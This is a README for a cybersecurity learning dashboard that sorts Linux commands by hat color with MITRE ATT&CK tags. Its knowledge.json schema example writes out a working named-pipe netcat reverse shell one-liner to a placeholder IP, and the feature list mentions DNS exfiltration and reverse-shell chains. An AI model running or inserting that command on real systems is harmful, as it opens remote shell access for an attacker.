# Fav Linux Commands — Cybersecurity Toolbook

A local cybersecurity intelligence dashboard built around a curated Linux command playlist. Commands are classified by hat color, enriched with MITRE ATT&CK tags, attack vectors, defense use cases, quick-use examples, and multi-tool combinations. Attack and defense chains show real, VM-ready multi-step scenarios.

![Stack](https://img.shields.io/badge/stack-React%20%2B%20FastAPI-blue) ![License](https://img.shields.io/badge/license-MIT-green)

---

## Features

- **Hat classification** — Black Hat (offensive), Red Hat (pentesting/recon), Blue Hat (defensive), Gray (utility)
- **MITRE ATT&CK tags** per command with threat level 1–5
- **Toolbook layer** — quick-use one-liners and combinations with other tools outside the playlist
- **Attack & Defense Chains** — 25 multi-step scenarios (DNS exfil, reverse shells, incident response, privilege escalation, and more) with copyable VM-ready examples
- **Search** — filters across commands, MITRE tags, attack vectors, and transcripts
- **No backend needed at runtime** — everything is baked into a static `knowledge.json`

---

## Stack

| Layer | Tech |
|-------|------|
| Frontend | React 18 · Vite · plain CSS (no UI libraries) |
| Build script | Python 3 · pytubefix · youtube-transcript-api |
| Runtime data | Static `knowledge.json` served by Vite |

---

## Quick Start

### 1. Build the knowledge base (run once)

Requires Python 3.10+ and the dependencies below.

```bash
cd backend
pip install pytubefix youtube-transcript-api
python build_knowledge.py
```

This fetches the playlist, attempts transcripts (cached in `transcript_cache.json`), merges all security metadata, and writes `frontend/public/knowledge.json`.

> **YouTube transcript blocks**: If you get IP-blocked, export `cookies.txt` from your browser using the "Get cookies.txt LOCALLY" Chrome extension, place it in `backend/`, and re-run the script.

### 2. Run the frontend

```bash
cd frontend
npm install
npm run dev
```

App runs at `http://localhost:5173`. No backend server needed.

---

## Project Structure

```
linux-notes/
├── backend/
│   ├── build_knowledge.py   # run once — generates knowledge.json
│   ├── main.py              # FastAPI server (optional, for live transcript fetch)
│   ├── processor.py         # transcript + command extraction logic
│   ├── requirements.txt
│   └── transcript_cache.json
└── frontend/
    ├── public/
    │   └── knowledge.json   # generated static data — the entire app source of truth
    └── src/
        ├── App.jsx
        ├── App.css
        └── components/
            ├── SecurityCard.jsx   # command card with toolbook sections
            ├── ChainsView.jsx     # attack/defense chains
            ├── HatFilter.jsx
            ├── SearchBar.jsx
            └── StatsBar.jsx
```

---

## knowledge.json Schema

```jsonc
{
  "generated_at": "...",
  "total_videos": 100,
  "hat_counts": { "black": 23, "red": 29, "blue": 22, "gray": 26 },
  "videos": [
    {
      "command": "mkfifo",
      "hat": "black",
      "security_intent": "...",
      "attack_vectors": ["reverse shell", "backdoor creation"],
      "defense_use": "...",
      "mitre_tags": ["T1059.004", "T1090.001"],
      "threat_level": 5,
      "related_commands": ["nc", "bash", "nohup"],
      "quick_use": ["mkfifo /tmp/.f", "mkfifo /tmp/.f; nc ... </tmp/.f | /bin/sh >/tmp/.f"],
      "combinations": [
        { "with": "nc", "example": "mkfifo /tmp/.f; nc 10.0.0.1 4444 </tmp/.f | /bin/bash >/tmp/.f 2>&1", "note": "Classic named-pipe reverse shell" }
      ],
      "transcript": "...",
      "video_url": "https://www.youtube.com/watch?v=..."
    }
  ],
  "attack_chains": [ /* 25 chains */ ]
}
```

---

## Hat Color Legend

| Color | Meaning | Threat |
|-------|---------|--------|
| Black Hat | Offensive — direct attack primitives | 3–5 |
| Red Hat | Pentesting — recon, enumeration, exploitation | 2–4 |
| Blue Hat | Defensive — monitoring, hardening, forensics | 1–3 |
| Gray | Utility — general Linux, indirect security value | 1–2 |

---

## Optional: Live Backend

The FastAPI backend in `main.py` exposes `/api/playlist` and `/api/process` for fetching transcripts on demand. It is not needed if `knowledge.json` is already built.

```bash
cd backend
pip install -r requirements.txt
uvicorn main:app --reload
# runs at http://localhost:8000
```

---

## Source Playlist

[Linux Commands — Cybersecurity Focus](https://www.youtube.com/playlist?list=PLp31D6HATKfeEHEFqFo5hlCOYwHi4Sl9O)
